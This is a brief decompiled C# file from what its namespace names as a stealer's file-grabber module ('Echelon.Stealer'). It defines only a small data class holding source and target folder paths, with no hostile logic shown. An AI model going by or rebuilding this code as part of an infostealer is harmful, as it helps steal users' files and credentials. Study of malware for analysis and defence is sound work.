using System;

namespace Echelon.Stealer.FileGrabber
{
	// Token: 0x0200001A RID: 26
	public class GetFiles
	{
		// Token: 0x02000233 RID: 563
		public class Folders : IFolders
		{
			// Token: 0x0600166D RID: 5741 RVA: 0x000740F0 File Offset: 0x000722F0
			public Folders(string source, string target)
			{
				this.Source = source;
				this.Target = target;
			}

			// Token: 0x170004AD RID: 1197
			// (get) Token: 0x0600166E RID: 5742 RVA: 0x00074108 File Offset: 0x00072308
			public string Source { get; }

			// Token: 0x170004AE RID: 1198
			// (get) Token: 0x0600166F RID: 5743 RVA: 0x00074110 File Offset: 0x00072310
			public string Target { get; }
		}
	}
}
